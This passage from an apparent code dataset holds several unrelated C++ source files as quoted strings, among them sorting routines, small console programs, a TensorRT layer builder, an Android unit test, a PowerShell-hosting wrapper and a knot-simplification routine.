{\r\n\t\t\tthis->working_days=working_days;\r\n\t\t\tthis->working_hours=working_hours;\r\n\t\t\tthis->night_shift=night_shift;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setwd (int wd) {\r\n\t\t\tworking_days=wd;\r\n\t\t}\r\n\t\t\r\n\t\tint getwd () {\r\n\t\t\treturn working_days;\r\n\t\t}\r\n\t\t\r\n\t\tvoid setwh (int wh) {\r\n\t\t\tworking_hours=wh;\r\n\t\t}\r\n\t\t\r\n\t\tint getwh () {\r\n\t\t\treturn working_hours;\r\n\t\t}\r\n\t\t\r\n\t   \tvoid setns (bool ns) {\r\n\t\t\tnight_shift=ns;\r\n\t\t}\r\n\t\t\r\n\t\tint getns () {\r\n\t\t\treturn night_shift;\r\n\t\t}\r\n\t\t\r\n\t\tvoid attendent_preferences () {\r\n\t\t\tcout<<\"\\nEnter your details\"<<endl;\r\n\t\t\tcout<<\"\\nName: \";\r\n\t\t\tcin>>name;\r\n\t\t\tcout<<\"\\nAge: \";\r\n\t\t\tcin>>age;\r\n\t\t\tcout<<\"\\nEmployee id: \";\r\n\t\t\tcin>>emp_id;\r\n\t\t\tcout<<\"\\nEnter your job preferences\"<<endl;\r\n\t\t\tcout<<\"\\nEnter your preferred number of working days: \";\r\n\t\t\tcin>>working_days;\r\n\t\t\tcout<<\"\\nEnter your preffered number of working hours: \";\r\n\t\t\tcin>>working_hours;\r\n\t\t\tcout<<\"\\nAre you willing to do night shifts ? Press 1 for yes and 0 for No: \";\r\n\t\t\tcin>>night_shift;\r\n\t\t\tcout<<\"\\n\\n-----------------------------------------Registration complete----------------------------------------\\n\\n\"<<endl;\r\n\t\t}\r\n\t\r\n\tvoid show(){\r\n\t\t\r\n\t\tcout<<\"Employee Id: \"<<emp_id<<\"\\nName: \"<<name<<\"\\nAge: \"<<age<<\"\\nWorking Days: \"<<working_days<<\"\\nWorking Hours: \"<<working_hours<<\"\\nNight shift: \"<<night_shift<<endl;\t\t\r\n\t}\t\r\n\t\r\n\tvoid write(ofstream &fout){\r\n\r\n\t\tfout<<emp_id<<\"\\n\"<<name<<\"\\n\"<<age<<\"\\n\"<<working_days<<\"\\n\"<<working_hours<<\"\\n\"<<night_shift<<endl;\r\n\t}\r\n\r\n\r\n};\r\n\r\nclass students\r\n{\r\n\tpublic: \r\n\r\n\tstring student_name;\t\r\n\tstring roll_no;\t\r\n\tstring student_year;\r\n\tint location;\r\n\tint buss_no;\r\n\t\r\n\t\r\n\tstudents(){}\r\n\t\r\n\tstudents(string student_name, string roll_no, string student_year, int location, int buss_no){\r\n\t\tthis->student_name = student_name;\r\n\t\tthis->roll_no = roll_no;\r\n\t\tthis->student_year = student_year;\r\n\t\tthis->location = location;\r\n\t\tthis->buss_no = buss_no;\r\n\t}\t\r\n\t\r\n\tvoid show_data(){\r\n\t\t\r\n\t\tcout<<\"\\nStudent Name: \"<<student_name<<\"\\tRoll No: \"<<roll_no<<\"\\tStudent Year: \"<<student_year<<\"\\tLocation \"<<location<<\"\\tBuss No: \"<<buss_no<<endl;\r\n\t}\r\n\t\r\n\tvoid write(ofstream &fout){\r\n\t\r\n\t\tfout<<student_name<<\"\\n\"<<roll_no<<\"\\n\"<<student_year<<\"\\n\"<<location<<\"\\n\"<<buss_no<<\"\\n\";\r\n\r\n\t}\r\n\t\t\t\r\n};\r\n\r\nclass admin\r\n{\r\n\tint passcode;\r\n\t\r\n\tpublic:\r\n\t\r\n\tadmin(int passcode){\r\n\t\tthis->passcode = passcode;\r\n\t}\r\n\t\r\n\tint get_passcode(){\r\n\t\treturn passcode;\r\n\t}\r\n\t\r\n\tvoid set_passcode(int passcode){\r\n\t\tthis->passcode = passcode;\r\n\t}\r\n\t\r",
    "#include <iostream>\r\n#include <stack>\r\nusing namespace std;\r\nvoid insertionSort(int *pD, int N){\r\n    if (N<2) return;\r\n    for (int i=0,j;i<N;i++){\r\n        int temp=pD[i];\r\n        for (j=i-1;j>-1;j--){\r\n            if (pD[j]<=temp) {\r\n                break;}\r\n            else pD[j+1]=pD[j];\r\n        }\r\n        pD[j+1]=temp;\r\n        for (int i=0;i<N;i++) {\r\n            cout<<\" \"<<pD[i];\r\n        }\r\n        cout<<endl;\r\n    }\r\n}\r\nvoid selectionSort(int *pD, int N){\r\n    if (N<2) return;\r\n    for (int i=0; i<N;i++){\r\n        int minIdx=i;\r\n        for (int j=i+1;j<N;j++){\r\n            if (pD[j]<pD[minIdx]) minIdx=j; \r\n        }\r\n        swap (pD[minIdx], pD[i]);\r\n        for (int i=0;i<N;i++) {\r\n            cout<<\" \"<<pD[i];\r\n        }\r\n        cout<<endl;\r\n    }\r\n}\r\nvoid bubbleSort (int *pD, int N){\r\n    if (N<2) return;\r\n    for (int i=0;i<N;i++){\r\n        for (int j=0;j<N-i-1;j++){\r\n            if (pD[j]>pD[j+1]) swap(pD[j], pD[j+1]);\r\n            for (int i=0;i<N;i++) {\r\n                cout<<\" \"<<pD[i];\r\n            }\r\n            cout<<endl;\r\n        }\r\n    }\r\n}\r\nvoid ShellSort(int *pD, int N, int step){\r\n    if (N<2) return;\r\n    for (int i=step,j;i<N;i+=step){\r\n        int temp=pD[i];\r\n        for (j=i-step;j>-1;j-=step){\r\n            if (pD[j]<=temp) {\r\n                break;}\r\n            else pD[j+step]=pD[j];\r\n        }\r\n        pD[j+step]=temp;\r\n    }\r\n}\r\nvoid shellSort(int *pD, int N){\r\n    stack<int> st;\r\n    int step=1;\r\n    st.push(1);\r\n    while (step<N){\r\n        step=step*3+1;\r\n        if (step<N) st.push(step);\r\n    }\r\n    while (!st.empty())\r\n    {\r\n        step=st.top();\r\n        st.pop();\r\n        for (int i=0; i<step;i++) ShellSort(pD, N - 1, step);\r\n        for (int i=0;i<N;i++) {\r\n                cout<<\" \"<<pD[i];\r\n            }\r\n        cout<<endl;\r\n    }\r\n    \r\n}\r\nvoid mergeSort(int *pD, int N){\r\n    if (N<2) return;\r\n    int N2=N/2;\r\n    mergeSort (pD, N2);\r\n    mergeSort (pD+N2, N-N2);\r\n\r\n    int *pintemp= new int[N2];\r\n    for (int i=0;i<N2;i++) pintemp[i]=pD[i];\r\n    int *pintarget=pD, *pL=pintemp, *   pLE=pintemp+N2, *pR=pD+N2, *pRE=pD+N;\r\n    while (pL!=pLE && pR!=pRE)\r\n    {\r\n        if (*pL>*pR) *pintarget++=*pR++;\r\n        else *pintarget++=*pL++;\r\n    }\r\n    while (pL!=pLE) *pintarget++=*pL++;\r\n    while (pR!=pRE) *pintarget++=*pR++;\r\n    for (int i=0;i<N;i++){\r\n        cout<<pD[i]<<\" \";\r\n    }\r\n    cout<<endl;\r\n    delete[] pintemp;\r\n}\r\n\r\nvoid quickSort(int *pD, int N){\r\n    if (N<2) return;\r\n    int *pL=pD, *pR=pD+N-1, *pPivot=pD+N/2;\r\n    while (pL<pR)\r\n    {\r\n        while (*pPivot>*pL) pL++;\r\n        while (*pPivot<=*pR) pR--;\r\n        if (pL<pR) {\r\n            if (pL==pPivot) pPivot=pR;\r\n            else if (pR==pPivot) pPivot=pL;\r\n            swap(*pL, *pR);\r\n        }   \r\n        else break;     \r\n        pL++;\r\n        pR--;\r\n    }\r\n    if (pPivot!=pL ){\r\n        swap (*pL, *pPivot);\r\n    }\r\n    quickSort(pD, pL-pD);\r\n    quickSort(pL+1, pD+N-pL-1);\r\n}\r\nint main(){\r\n    int N=10;\r\n    int *a= new int[N];\r\n    for (int i=0;i<N;i++){\r\n        a[i]=(rand()%100);\r\n    }\r\n    cout<<\"Merge Sort:\";\r\n    for (int i=0;i<N;i++) {\r\n            cout<<\" \"<<a[i];\r\n    }\r\n    cout<<endl;\r\n    // insertionSort(a, N);\r\n    //selectionSort(a, N);\r\n    quickSort(a, N);\r\n    for (int i=0;i<N;i++){\r\n        cout<<a[i]<<\" \";\r\n    }\r\n}\r\n",
    "/*\n * Created by Marcos Luciano\n * https://www.github.com/marcoslucianops\n */\n\n#include \"implicit_layer.h\"\n\n#include <cassert>\n\nnvinfer1::ITensor*\nimplicitLayer(int layerIdx, std::map<std::string, std::string>& block, std::vector<float>& weights,\n    std::vector<nvinfer1::Weights>& trtWeights, int& weightPtr, nvinfer1::INetworkDefinition* network)\n{\n  nvinfer1::ITensor* output;\n\n  assert(block.at(\"type\") == \"implicit_add\" || block.at(\"type\") == \"implicit_mul\");\n  assert(block.find(\"filters\") != block.end());\n\n  int filters = std::stoi(block.at(\"filters\"));\n\n  nvinfer1::Weights convWt {nvinfer1::DataType::kFLOAT, nullptr, filters};\n\n  float* val = new float[filters];\n  for (int i = 0; i < filters; ++i) {\n    val[i] = weights[weightPtr];\n    ++weightPtr;\n  }\n  convWt.values = val;\n  trtWeights.push_back(convWt);\n\n  nvinfer1::IConstantLayer* implicit = network->addConstant(nvinfer1::Dims{3, {filters, 1, 1}}, convWt);\n  assert(implicit != nullptr);\n  std::string implicitLayerName = block.at(\"type\") + \"_\" + std::to_string(layerIdx);\n  implicit->setName(implicitLayerName.c_str());\n  output = implicit->getOutput(0);\n\n  return output;\n}\n",
    "#include <vector>\r\n#include <iostream>\r\n#include <string>\r\n\r\nusing namespace std;\r\n\r\nconst int maxTasks = 100;\r\nvector<string> tasks;\r\n\r\nvoid menu();\r\nvoid viewTasks();\r\nvoid addTask();\r\nvoid removeTask();\r\n\r\nint main() {\r\n    while (true) {\r\n        int option;\r\n        menu();\r\n        cout << endl << \"Select an option: \";\r\n        cin >> option;\r\n\r\n        if (cin.fail()) {\r\n            cin.clear();\r\n            cin.ignore(INT_MAX, '\\n');\r\n            cout << \"Invalid input. Please enter a number.\" << endl;\r\n            continue;\r\n        }\r\n\r\n        switch (option) {\r\n            case 1:\r\n                viewTasks();\r\n                break;\r\n            case 2:\r\n                addTask();\r\n                break;\r\n            case 3:\r\n                removeTask();\r\n                break;\r\n            case 4:\r\n                return 0;\r\n            default:\r\n                cout << \"Invalid option. Please try again.\" << endl;\r\n                break;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\nvoid menu() {\r\n    cout << \"To-Do List Menu\" << endl;\r\n    cout << \"[1] View Task(s)\" << endl;\r\n    cout << \"[2] Add Task\" << endl;\r\n    cout << \"[3] Remove Task\" << endl;\r\n    cout << \"[4] Exit\" << endl;\r\n}\r\n\r\nvoid viewTasks() {\r\n    if (tasks.empty()) {\r\n        cout << \"No tasks have been added yet!\\n\" << endl;\r\n    } else {\r\n        cout << \"Tasks:\" << endl;\r\n        for (size_t i = 0; i < tasks.size(); ++i) {\r\n            cout << \"[ \" << i + 1 << \" ] \" << tasks[i] << endl;\r\n        }\r\n        cout << endl;\r\n    }\r\n}\r\n\r\nvoid addTask() {\r\n    if (tasks.size() < maxTasks) {\r\n        cin.ignore(); \r\n        cout << \"Add task: \";\r\n        string newTask;\r\n        getline(cin, newTask);\r\n        tasks.push_back(newTask);\r\n        cout << \"Task added.\\n\" << endl;\r\n    } else {\r\n        cout << \"Oops! You've reached the maximum amount of tasks\\n\" << endl;\r\n    }\r\n}\r\n\r\nvoid removeTask() {\r\n    if (tasks.empty()) {\r\n        cout << \"No tasks to remove.\\n\" << endl;\r\n        return;\r\n    }\r\n\r\n    viewTasks();\r\n    int taskNumber;\r\n    cout << \"Select the task number you want to remove: \";\r\n    cin >> taskNumber;\r\n\r\n    if (cin.fail() || taskNumber <= 0 || taskNumber > tasks.size()) {\r\n        cin.clear(); \r\n        cin.ignore(INT_MAX, '\\n'); \r\n        cout << \"Invalid task number. Please try again.\" << endl;\r\n    } else {\r\n        tasks.erase(tasks.begin() + taskNumber - 1);\r\n        cout << \"Task removed.\\n\" << endl;\r\n    }\r\n}\r\n\r\n",
    "/*\n * Copyright (C) 2016 The Android Open Source Project\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n *      http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"NativeBridgeTest.h\"\n\nnamespace android {\n\nTEST_F(NativeBridgeTest, V3_IsPathSupported) {\n    // Init\n    ASSERT_TRUE(LoadNativeBridge(kNativeBridgeLibrary3, nullptr));\n    ASSERT_TRUE(NativeBridgeAvailable());\n    ASSERT_TRUE(PreInitializeNativeBridge(\".\", \"isa\"));\n    ASSERT_TRUE(NativeBridgeAvailable());\n    ASSERT_TRUE(InitializeNativeBridge(nullptr, nullptr));\n    ASSERT_TRUE(NativeBridgeAvailable());\n\n    ASSERT_EQ(3U, NativeBridgeGetVersion());\n    ASSERT_EQ(true, NativeBridgeIsPathSupported(nullptr));\n\n    // Clean-up code_cache\n    ASSERT_EQ(0, rmdir(kCodeCache));\n}\n\n}  // namespace android\n",
    "// PowershellExecutor (C++/CLI)\nPowershellExecutor::.ctor\nPowershellExecutor::Debug_DataAdded\nPowershellExecutor::SendLog\nPowershellExecutor::Error_DataAdded\nPowershellExecutor::Verbose_DataAdded\nPowershellExecutor::Warning_DataAdded\nPowershellExecutor::OnOutputDataReceived\nPowershellExecutor::DataAddedEventHandler\nPowershellExecutor::Information_DataAdded\nPowershellExecutor::OnOutputDataReceived\nPowershellExecutor::HandleInformation\nPowershellExecutor::BindEvents\nPowershellExecutor::ExecutePowerShell\nStringUtil::ConvertWstringToUtf8String\n\n// PowershellExecutor.h (C++/CLI Header)\n#pragma once\n\n#include <string>\n#include <msclr/marshal_cppstd.h>\n#include <System.Management.Automation.h>\n#include \"PowerShellExecutionResult.h\"\n\nusing namespace System;\nusing namespace System::Collections::ObjectModel;\nusing namespace System::Management::Automation;\nusing namespace System::Collections::Generic;\n\nref class PowershellExecutor\n{\nprivate:\n    Callbacks ^ callbacks;\n    int activityLogCounter;\n    int verboseLinesProcessed;\n    int warningLinesProcessed;\n    const int activityLogThreshold = 1000;\n\n    void SendLog(String ^ logMessage, LogOutputType logType);\n    void Debug_DataAdded(Object ^ sender, DataAddedEventArgs ^ e);\n    void Progress_DataAdded(Object ^ sender, DataAddedEventArgs ^ e);\n    void Error_DataAdded(Object ^ sender, DataAddedEventArgs ^ e);\n    void Verbose_DataAdded(Object ^ sender, DataAddedEventArgs ^ e);\n    void Warning_DataAdded(Object ^ sender, DataAddedEventArgs ^ e);\n    void Information_DataAdded(Object ^ sender, DataAddedEventArgs ^ e);\n    void OnOutputDataReceived(Object ^ sender, DataReceivedEventArgs ^ e);\n    void Host_OnInformation(String ^ information);\n    void HandleInformation(String ^ logOutput);\n    void BindEvents(PowerShell ^ _ps, DefaultHost ^ host);\n\n    void LogException(const std::exception &ex, const std::string &context);\n    void LogManagedException(Exception ^ ex, const std::string &context);\n\npublic:\n    PowershellExecutor(Callbacks ^ callbacks);\n    PowerShellExecutionResult ^ ExecutePowerShell(String ^ script, Dictionary<String ^, Object ^> ^ parameters);\n};\n\n\n// PowershellExecutor.cpp\n\n#include \"PowerShellExecutor.h\"\n#include \"ProcessUtil.h\"\n#include \"SettingsService.h\"\n#include \"LogUtil.h\"\n#include \"StringUtil.h\"\n\nusing namespace msclr::interop;\nusing namespace System::Globalization;\nusing namespace System::IO;\n\n// Assuming this is the structure of your Callbacks class\nstruct Callbacks\n{\n    void (*LogCallback)(const char *, int);\n};\n\nPowerShellExecutor::PowerShellExecutor(IntPtr callbacks)\n    : callbacks(callbacks), verboseLinesProcessed(0), warningLinesProcessed(0),\n      errorLinesProcessed(0), informationLinesProcessed(0), activityLogCounter(0),\n      activityLogThreshold(1000)\n{\n}\n\nvoid PowerShellExecutor::SendLog(String ^ logOutput, LogOutputType logType)\n{\n    if (activityLogCounter > activityLogThreshold)\n    {\n        auto callbacksPtr = static_cast<Callbacks *>(callbacks.ToPointer());\n        std::string message = \"ActivityLogthresholdexceeded\";\n        callbacksPtr->LogCallback(message.c_str(), static_cast<int>(LogOutputType::Error));\n        throw gcnew Exception(\"Activity Log threshold exceeded.\");\n    }\n\n    auto callbacksPtr = static_cast<Callbacks *>(callbacks.ToPointer());\n    std::string utf8LogOutput = marshal_as<std::string>(logOutput);\n    callbacksPtr->LogCallback(utf8LogOutput.c_str(), static_cast<int>(logType));\n\n    activityLogCounter++;\n}\n\nvoid PowershellExecutor::Debug_DataAdded(Object ^ sender, DataAddedEventArgs ^ e)\n{\n    try\n    {\n        String ^ text = \"\";\n        int num = 0;\n        if (num < safe_cast<PSDataCollection<DebugRecord ^> ^>(sender)->Count)\n        {\n            do\n            {\n                DebugRecord ^ debugRecord = (*static_cast<PSDataCollection<DebugRecord ^> ^>(sender))[num];\n                text += debugRecord->Message;\n                num++;\n            } while (num < safe_cast<PSDataCollection<DebugRecord ^> ^>(sender)->Count);\n        }\n        this->SendLog(text, LogOutputType::Debug);\n    }\n    catch (Exception ^ ex)\n    {\n        LogManagedException(ex, \"Debug_DataAdded\");\n    }\n}\n\nvoid PowershellExecutor::Progress_DataAdded(Object ^ sender, DataAddedEventArgs ^ e)\n{\n    try\n    {\n        auto progressRecords = safe_cast<PSDataCollection<ProgressRecord ^> ^>(sender);\n        for (int i = 0; i < progressRecords->Count; i++)\n        {\n            auto progressRecord = progressRecords[i];\n            String ^ activity = progressRecord->Activity;\n            String ^ statusDescription = progressRecord->StatusDescription;\n            Int32 percentComplete = progressRecord->PercentComplete;\n\n            String ^ message = String::Format(\"Activity: {0}, StatusDescription: {1}, PercentComplete: {2}%\",\n                                              activity, statusDescription, percentComplete);\n            this->SendLog(message, LogOutputType::Information);\n        }\n    }\n    catch (Exception ^ ex)\n    {\n  ",
    "/* \n *CS480 ASSIGNMENT 2\n *written by James Marsh and Grant Wilson\n *Created on 9 - 20 - 2023 at 4:51 pm\n *Updated: 9 - 28 - 2023 at 2:00 AM\n NEW \n WORKING!!!!!\n */\n\n#include <unistd.h>\n#include <iostream>\n#include <fstream>\n#include <string>\n#include <string.h>\n#include \"Trie.h\"\n#include <pthread.h>\n#include <stdio.h>\n#include \"readvocab.h\"\n#include \"readlines.h\"\n#include \"countvocabstrings.h\"\n\nusing namespace std;\n\n\n\n\n/*\n   PROGRESS BAR FOR COUNT VOCAB METHOD\n   DISPLAYS LIVE PROGRESS.. CATCHES UP IF IT FALLS BEHIND THE THREAD\n */\nvoid* countvocabProgressBar(void* args){\n\tSHARED_DATA* data = static_cast<SHARED_DATA*>(args);\n\tdouble progress = 0.0;\t//how much the therad has done\n\tdouble tempProgress = 0.0;//measures progress relative to internal progress\n\tdouble internalProgress=0.0;//how much has been printed\n\tint numOfHashes = (data->numOfProgressMarks)/(data->hashmarkInterval);// p/m\n\tdouble placeHash = ((double)data->hashmarkInterval)/((double)data->numOfProgressMarks);//percentage of when a hashmark should be placed\n\tdouble placeDash = placeHash/((double)data->hashmarkInterval);//percentage of when to place a dash-progress mark ....unless it equals placeHash\n\tint markerCount = 0;\n\tint hashCount = 1;\n\n\twhile(progress<1.0){\n\t\tprogress =((double)data->numOfProcessedLines)/(((double)data->lineCountInFile[TESTFILEINDEX]));\n\t\ttempProgress = progress-internalProgress;//Temp is How Much Progress Made\n\t\twhile(tempProgress>0){ //While we have Made any progress\n\t\t\tif(tempProgress>=placeDash){ //If Progress Made is more than the amount to place a Dash\n\n\t\t\t\t//check if next marker to place is Hashmark\n\t\t\t\tif ((markerCount+1)/hashCount == data->hashmarkInterval) {\n\t\t\t\t\thashCount++;\n\t\t\t\t\tprintf(\"#\");\n\t\t\t\t\tcout.flush();\n\t\t\t\t\tinternalProgress = internalProgress+placeDash;//increase internal progress for a mark\n\t\t\t\t\tmarkerCount++;\n\t\t\t\t\ttempProgress = tempProgress-placeDash;//decrease the relative progress\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\n\t\t\t\t//enough progress for a dash, but isn't hashmark interval\n\t\t\t\tprintf(\"-\");\n\t\t\t\tmarkerCount++;\n\t\t\t\tcout.flush();\n\t\t\t\tinternalProgress = internalProgress+placeDash;\n\t\t\t\ttempProgress = tempProgress-placeDash;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tbreak;//needs more progress in order to place next marker\n\t\t}\n\t}\n\t//prints the last char and accounts for odd numbers\n\tif(markerCount!=data->numOfProgressMarks && data->numOfProgressMarks%data->hashmarkInterval!=0){\n\t\tprintf(\"-\");\n\t\tmarkerCount++;\n\t\tcout.flush();\n\t}\n\telse if(hashCount-1 != numOfHashes){\n\t\tprintf(\"#\");\n\t\tcout.flush();\n\t}\n\tprintf(\"\\nThere are %d lines in testfile.txt\\n\",data->lineCountInFile[TESTFILEINDEX]);\n\treturn nullptr;\n}\n\n\n\n//PROGRESS BAR for readvocab thread...nearly identical to the countvocabstrings progress bar\nvoid* readvocabProgressBar(void* args){\n\tSHARED_DATA* data = static_cast<SHARED_DATA*>(args);\n\tdouble progress = 0.0;\n\tdouble tempProgress = 0.0;\n\tdouble internalProgress=0.0;\n\tint numOfHashes = (data->numOfProgressMarks)/(data->hashmarkInterval);// p/m\n\tdouble placeHash = ((double)data->hashmarkInterval)/((double)data->numOfProgressMarks);//percentage of when a hashmark should be placed\n\tdouble placeDash = placeHash/((double)data->hashmarkInterval);//percentage of when to place a dash-progress mark...unless it equals placeHash\n\tint markerCount = 0;\n\tint hashCount = 1;\n\n\twhile(progress<1.0){\n\t\tprogress =((double)data->numOfCharsReadFromVocabFile)/((double)data->totalNumOfCharsInVocabFile);\n\t\ttempProgress = progress-internalProgress;//Temp is How Much Progress Made\n\t\twhile(tempProgress>0){ //While we have Made any progress\n\t\t\tif(tempProgress>=placeDash){ //If Progress Made is more than the amount to place a Dash\n\t\t\t\tif ((markerCount+1)/hashCount == data->hashmarkInterval) {\t\n\t\t\t\t\thashCount++;\n\t\t\t\t\tprintf(\"#\");\n\t\t\t\t\tcout.flush();\n\t\t\t\t\tinternalProgress = internalProgress+placeDash;\n\t\t\t\t\tmarkerCount++;\n\t\t\t\t\ttempProgress = tempProgress-placeDash;\n\t\t\t\t\tcontinue;\n\t\t\t\t}\n\t\t\t\tprintf(\"-\");\n\t\t\t\tmarkerCount++;\n\t\t\t\tcout.flush();\n\t\t\t\tinternalProgress = internalProgress+placeDash;\n\t\t\t\ttempProgress = tempProgress-placeDash;\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tbreak;\n\t\t}\n\t}\n\t//prints the last char and accounts for odd numbers\n\tif(markerCount!=data->numOfProgressMarks && data->numOfProgressMarks%data->hashmarkInterval!=0){\n\t\tprintf(\"-\");\n\t\tmarkerCount++;\n\t\tcout.flush();\n\t}\n\telse if(hashCount-1 != numOfHashes){\n\t\tprintf(\"#\");\n\t\tcout.flush();\n\t}\n\tprintf(\"\\nThere are %d lines in vocabulary.txt\\n\",data->lineCountInFile[VOCABFILEINDEX]);\n\treturn nullptr;\n}\n\n\n\n//main thread to handle error checking, output file, and spawn other threads.\nint main(int argc, char* argv[]){\n\n\tif(argc<3){\n\t\tprintf(\"invalid arguments\\n\");\n\t\texit(NORMAL_EXIT);\n\t}\n\n\t//Struct null and 0 initializer for all fields\n\tSHARED_DATA* data = new SHARED_DATA;\n\n\tdata->numOfProgressMarks = DEFAULT_NUMOF_MARKS; //OR SET TO 0?\n\tdata->hashmarkInterval = DEFAULT_HASHMARKINTERVAL;//^\n\tdata->minNumOfVocabStringsContainedForPrinting = DEFAULT_MINNUM_OFVOCABSTRINGS_CONTAINED;//^\n\tfor(int i = 0; i<NUMOFFILES; i++){\n\t\tdata",
    "#include <iostream>\r\n\r\nusing namespace std;\r\nstruct vec\r\n{\r\n    int size;\r\n    int Capacity;\r\n    int * PtrToData;\r\n};\r\n\r\nvec * Vector_Create(int Size) /\r\n{\r\n    vec * My_Vec = (vec *)malloc(sizeof(vec)); \r\n    My_Vec->PtrToData = (int *)malloc(Size * sizeof(int)); \r\n    My_Vec->size = Size;\r\n    My_Vec->Capacity = Size; \r\n    return My_Vec;\r\n}\r\n\r\nvoid Vector_DeleteFromMemory(vec * My_Vec)\r\n{\r\n    if (NULL != My_Vec)\r\n    {\r\n        free(My_Vec->PtrToData);\r\n        free(My_Vec);\r\n    }\r\n}\r\n\r\nvoid Vector_PrintAllElements(vec * My_Vec)\r\n{\r\n    if (NULL != My_Vec)\r\n    {\r\n        cout << \"Your Vector Data Collection: \\n\";\r\n        for (int i = 0; i < My_Vec->size; i++)\r\n        {\r\n            printf(\"%d \", My_Vec->PtrToData[i]);\r\n        }\r\n       cout << endl;\r\n    }\r\n}\r\n\r\nvoid Vector_PrintOneElement(vec * My_Vec, int Index)\r\n{\r\n    if (Index >= My_Vec->size || Index < 0)\r\n    {\r\n        cout << \"Out Of Boundary!!\" << endl;\r\n    }\r\n    else\r\n    {\r\n        printf(\"The %d Element is: %d\\n\", Index, My_Vec->PtrToData[Index]);\r\n    }\r\n}\r\n\r\nvoid Vector_InsertOneElement(vec * My_Vec, int Index, int value)\r\n{\r\n    if (My_Vec->Capacity > My_Vec->size && Index == My_Vec->size) \r\n    {\r\n        My_Vec->PtrToData[Index] = value;\r\n        My_Vec->size++;\r\n    }\r\n    else\r\n    {\r\n        if (Index < 0 || Index > My_Vec->size)\r\n        {\r\n            cout << \"Out of Boundaries\" << endl;\r\n        }\r\n        else\r\n        {\r\n            if (My_Vec->size == My_Vec->Capacity) \r\n            {\r\n                My_Vec->Capacity *= 2;\r\n                My_Vec->PtrToData = (int *)realloc(My_Vec->PtrToData, My_Vec->Capacity * sizeof(int));\r\n            }\r\n\r\n           \r\n            for (int i = My_Vec->size; i > Index; i--)\r\n            {\r\n                My_Vec->PtrToData[i] = My_Vec->PtrToData[i - 1];\r\n            }\r\n\r\n            \r\n            My_Vec->PtrToData[Index] = value;\r\n            My_Vec->size++;\r\n        }\r\n    }\r\n}\r\n\r\nvoid Vector_DeleteOneElement(vec * My_Vec, int Index)\r\n{\r\n    if (My_Vec->size == 0)\r\n    {\r\n        cout << \"No Elements to delete\" << endl;\r\n    }\r\n    else\r\n    {\r\n        if (Index < 0 || Index >= My_Vec->size)\r\n        {\r\n            cout << \"Out of Boundaries\" << endl;\r\n        }\r\n        else\r\n        {\r\n           \r\n            for (int i = Index; i < My_Vec->size - 1; i++)\r\n            {\r\n                My_Vec->PtrToData[i] = My_Vec->PtrToData[i + 1];\r\n            }\r\n\r\n            My_Vec->size--;\r\n        }\r\n    }\r\n}\r\n\r\nint main()\r\n{\r\n    int initialSize = 5;\r\n    vec *myVector = Vector_Create(initialSize);\r\n\r\n    \r\n    for (int i = 0; i < initialSize; i++)\r\n    {\r\n        myVector->PtrToData[i] = i + 1;\r\n    }\r\n\r\n    \r\n    Vector_PrintAllElements(myVector);\r\n\r\n    \r\n    cout << \"\\nInserting 99 at index 2\" <<endl;\r\n    Vector_InsertOneElement(myVector, 2, 99);\r\n    Vector_PrintAllElements(myVector);\r\n\r\n    \r\n    cout << \"\\nPrinting element at index 2\" << endl;\r\n    Vector_PrintOneElement(myVector, 2);\r\n\r\n    \r\n    cout << \"\\nDeleting element at index 2\" << endl;\r\n    Vector_DeleteOneElement(myVector, 2);\r\n    Vector_PrintAllElements(myVector);\r\n\r\n    \r\n    Vector_DeleteFromMemory(myVector);\r\n\r\n    return 0;\r\n}\r\n",
    "#include \"linkedsimplifier.h\"\n\n#include <unordered_set>\n#include <unordered_map>\n\nstruct LinkedChord final {\n    Unknotter::LinkedCross* contact_start;\n    Unknotter::LinkedCross* contact_end;\n    bool over_start;\n    bool over_end;\n\n    __forceinline LinkedChord() = default;\n    __forceinline LinkedChord(Unknotter::LinkedCross* Contact_Start, Unknotter::LinkedCross* Contact_End, bool Over_Start, bool Over_End)\n        : contact_start(Contact_Start),\n          contact_end(Contact_End),\n          over_start(Over_Start),\n          over_end(Over_End) { }\n};\n\nstruct LinkedChordNoSecond final {\n    Unknotter::LinkedCross* contact_start;\n    Unknotter::LinkedCross* contact_end;\n    bool over;\n\n    __forceinline LinkedChordNoSecond() = default;\n    __forceinline LinkedChordNoSecond(Unknotter::LinkedCross* Contact_Start, Unknotter::LinkedCross* Contact_End, bool Over)\n        : contact_start(Contact_Start),\n          contact_end(Contact_End),\n          over(Over) { }\n};\n\nbool Unknotter::CanBeRemovedImmediately(LinkedCross* PrimaryStart, bool PrimaryUpper, LinkedCross* PrimaryEnd, bool SecondaryForward) {\n    if (PrimaryStart == PrimaryEnd) {\n        return CanBeRemovedImmediately(PrimaryStart, PrimaryUpper);\n    }\n    \n    //gets crosses in primary band, excluding endpoints\n\n    std::unordered_set<LinkedCross*> set_primary;\n    LinkedCross* i_p = PrimaryStart;\n    bool i_o = PrimaryUpper;\n    while (LinkedCross::TravelN(i_p, i_o), i_p != PrimaryEnd) {\n        if (set_primary.insert(i_p).second) continue;\n        return false;\n    }\n\n    if (PrimaryUpper != i_o) {\n        return false;\n    }\n\n    //gets crosses in secondary band, excluding endpoints\n    //puts crosses in a combined set\n\n    std::unordered_set<LinkedCross*> set_combined(set_primary);\n    i_o = !i_o;\n    if (SecondaryForward) {\n        while (LinkedCross::TravelN(i_p, i_o), i_p != PrimaryStart) {\n            if (set_combined.insert(i_p).second) continue;\n            return false;\n        }\n        if (i_o == PrimaryUpper) return false;\n    }\n    else {\n        while (LinkedCross::TravelP(i_p, i_o), i_p != PrimaryStart) {\n            if (set_combined.insert(i_p).second) continue;\n            return false;\n        }\n        if (i_o == PrimaryUpper) return false;\n    }\n\n    //gets chords of the area\n\n    std::vector<LinkedChord> chords;\n    i_p = PrimaryEnd;\n    i_o = PrimaryUpper;\n    {\n        bool inside = false;\n        bool lastOver;\n        bool lastPrimary;\n        LinkedCross* lastContactPoint = 0;\n        while (true) {\n            LinkedCross::TravelN(i_p, i_o);\n            if (i_p == 